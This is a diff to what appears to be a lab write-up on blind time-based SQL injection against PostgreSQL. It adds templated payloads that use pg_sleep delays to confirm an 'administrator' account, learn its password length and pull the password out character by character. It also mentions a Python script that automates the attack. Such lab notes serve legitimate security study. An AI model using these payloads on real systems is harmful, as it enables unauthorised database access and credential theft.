@@ -73,7 +73,7 @@ Qdsgj7juZVDHmmYv'; SELECT pg_sleep(10)--
 2. Check if 'administrator' exists
 
 ```
-Qdsgj7juZVDHmmYv'; SELECT CASE WHEN ((SELECT COUNT(username) FROM users WHERE username='administrator')=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+{TRACKING_COOKIE}'; SELECT CASE WHEN (COUNT(username) > 0) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
 ```
 
 -> Indeed we have a user with username='administrator' (COUNT returns int)
@@ -81,7 +81,7 @@ Qdsgj7juZVDHmmYv'; SELECT CASE WHEN ((SELECT COUNT(username) FROM users WHERE us
 3. Figuring the length of the password
 
 ```
-Qdsgj7juZVDHmmYv'; SELECT CASE WHEN ((SELECT COUNT(username) FROM users WHERE username='administrator' AND LENGTH(Password) = 20)=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+{TRACKING_COOKIE}'; SELECT CASE WHEN (LENGTH(password) = 20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
 ```
 
 -> the length is: 20 characters
@@ -89,10 +89,10 @@ Qdsgj7juZVDHmmYv'; SELECT CASE WHEN ((SELECT COUNT(username) FROM users WHERE us
 4. Figuring out the actual password
 
 ```
-Qdsgj7juZVDHmmYv'; SELECT CASE WHEN ((SELECT COUNT(username) FROM users WHERE username='administrator' AND SUBSTRING(Password, 1, 1) > 'a')=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+{TRACKING_COOKIE}'; SELECT CASE WHEN (SUBSTRING(password, {i+1}, 1) = '{letter}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
 ```
 
 Note: the latter was just a test case, we'll use python to do this, cuz attacks are throttled in burpsuite community edition
 (I AM BROKE)
 
--> The script is found at `blind4.py`, and password is: ``
+-> The script is found at `blind4.py`
